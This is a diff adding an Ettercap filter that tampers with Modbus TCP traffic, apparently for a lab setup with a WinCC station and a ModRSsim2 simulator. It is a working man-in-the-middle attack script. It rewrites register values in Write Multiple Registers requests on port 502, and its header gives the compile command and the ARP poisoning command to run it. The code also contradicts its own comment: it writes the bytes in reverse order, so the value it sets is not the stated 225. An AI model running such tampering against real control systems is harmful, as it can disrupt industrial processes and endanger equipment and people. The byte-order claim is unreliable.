@@ -1,0 +1,45 @@
+/*
+ * modbus_tampering_write.ecf
+ *
+ * Ettercap filter — Modbus TCP Write Tampering
+ * Target: Write Multiple Registers (Function Code 0x10)
+ *
+ * Scenario:
+ *   Attacker is positioned as MiTM between WinCC (192.168.0.20)
+ *   and ModRSsim2 (192.168.0.10) via ARP poisoning.
+ *   This filter intercepts outgoing Write requests on port 502
+ *   and modifies the first register value in the payload.
+ *
+ * Modbus TCP packet layout (offsets within DATA.data[]):
+ *   [0-1]  Transaction ID
+ *   [2-3]  Protocol ID (0x00 0x00)
+ *   [4-5]  Length
+ *   [6]    Unit ID
+ *   [7]    Function Code  → 0x10 = Write Multiple Registers
+ *   [8-9]  Starting Address
+ *   [10-11] Quantity of Registers
+ *   [12]   Byte Count
+ *   [13-14] Register 0 value (Hi byte, Lo byte)  ← modified here
+ *   [15-16] Register 1 value
+ *   ...
+ *
+ * Compile:
+ *   etterfilter modbus_tampering_write.ecf -o modbus_tampering_write.ef
+ *
+ * Run (after ARP poisoning is active):
+ *   ettercap -T -q -F modbus_tampering_write.ef -M arp:remote \
+ *     /192.168.0.20// /192.168.0.10//
+ */
+
+if (ip.proto == TCP && tcp.dst == 502) {
+
+    /* Check Function Code = 0x10 (Write Multiple Registers) */
+    if (DATA.data[7] == 0x10) {
+
+        /* Overwrite first register value with 0x00E1 (225 decimal) */
+        DATA.data[13] = 0xE1;
+        DATA.data[14] = 0x00;
+
+        msg("TAMPERING: Modbus Write FC=0x10 — register value replaced with 225\n");
+    }
+}
